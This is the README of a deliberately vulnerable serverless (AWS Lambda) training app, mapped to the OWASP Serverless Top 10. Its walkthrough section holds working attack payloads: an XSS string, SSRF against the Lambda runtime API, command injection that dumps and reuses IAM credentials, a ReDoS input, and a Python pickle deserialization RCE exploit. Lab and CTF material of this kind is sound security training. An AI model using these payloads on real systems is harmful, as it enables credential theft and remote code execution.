# Very Vulnerable Serverless Application

A deliberately vulnerable serverless application for learning Lambda/serverless security testing. Maps to the **OWASP Serverless Top 10**.

> **WARNING:** Do not deploy this in a production environment. For training and CTF use only.

---

## OWASP Serverless Top 10 Coverage

| # | Vulnerability | Endpoint | Status |
|---|--------------|----------|--------|
| SLS-1 | Injection (XSS + Command Injection) | `/welcome/<name>`, `/login`, `/date` | ✅ |
| SLS-2 | Broken Authentication | N/A (hardcoded secret key) | ✅ |
| SLS-3 | Sensitive Data Exposure / SSRF | `/redirect?url=` | ✅ |
| SLS-4 | Insecure Deserialization | `/deserial` | ✅ |
| SLS-5 | Broken Access Control | IAM `s3:*` on `*` | ✅ |
| SLS-6 | Security Misconfiguration | `serverless.yml` (env vars, IAM) | ✅ |
| SLS-7 | Cross-Site Scripting (XSS) | `/welcome/<name>` | ✅ |
| SLS-8 | Insecure Third-Party Components | `requirements.txt` | ✅ |
| SLS-9 | Insufficient Logging & Monitoring | No CloudWatch alarms | ✅ |
| SLS-10 | Event Injection / ReDoS | `/redos?string=` | ✅ |

---

## Prerequisites

- AWS CLI configured: `aws configure`
- Python 3.12+
- Node.js 18+
- Serverless Framework: `npm install -g serverless`
- httpie (optional): `https://httpie.io/cli`

---

## Setup

1. Clone the repo:
    ```bash
    git clone https://github.com/peachycloudsecurity/very-vulnerable-serverless
    cd very-vulnerable-serverless
    ```

2. Install dependencies:
    ```bash
    npm install
    ```

3. Deploy:
    ```bash
    serverless deploy
    ```

4. Access the app at the URL from deploy output.

---

## Endpoints

| Method | Path | Vulnerability |
|--------|------|---------------|
| GET | `/` | Landing page |
| GET | `/welcome/<name>` | Injection / XSS |
| POST, GET | `/login` | Injection |
| GET | `/redirect?url=` | SSRF / Lambda runtime access |
| GET | `/date?exec=` | OS Command Injection |
| GET | `/redos?string=` | ReDoS |
| POST | `/deserial` | Insecure Deserialization (pickle RCE) |

---

## Attack Walkthroughs

### XSS / Injection
```
Open browser → Enter: "><img src=x onerror=alert('xss')>
```

### SSRF → Lambda Runtime
```bash
curl https://<endpoint>/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
```

### Command Injection → Credential Theft
```bash
# Execute arbitrary commands
curl "https://<endpoint>/date?exec=printenv"

# Steal Lambda IAM credentials, then:
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

### ReDoS
```bash
# Normal (fast):
curl "https://<endpoint>/redos?string=aaaaaab"

# Attack (exponential backtracking → timeout/502):
curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```

### Insecure Deserialization (Pickle RCE)
```python
import pickle, base64, requests

class PickleRCE:
    def __reduce__(self):
        import os
        return (os.system, ('touch /tmp/hacked',))

payload = base64.urlsafe_b64encode(pickle.dumps(PickleRCE())).decode()
requests.post('https://<endpoint>/deserial', data={'pickled': payload})

# Verify:
requests.get('https://<endpoint>/date?exec=ls -la /tmp/hacked')
```

---

## Cleanup

```bash
serverless remove
```

---

## Related Projects

- [ClientHub Vulnerable SaaS](https://github.com/peachycloudsecurity/clienthub-vulnerable-saas) — Full multi-tenant SaaS app with OWASP Top 10:2017 vulnerabilities, 2FA, S3 misconfig, and more.

---

## Disclaimer

Do not install on production environments. The author does not take responsibility for misuse. For educational and authorized security testing only.

## License

GNU General Public License v3.0 — see [LICENSE](LICENSE).

Credits: [Python-Pickle-RCE-Exploit](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit)
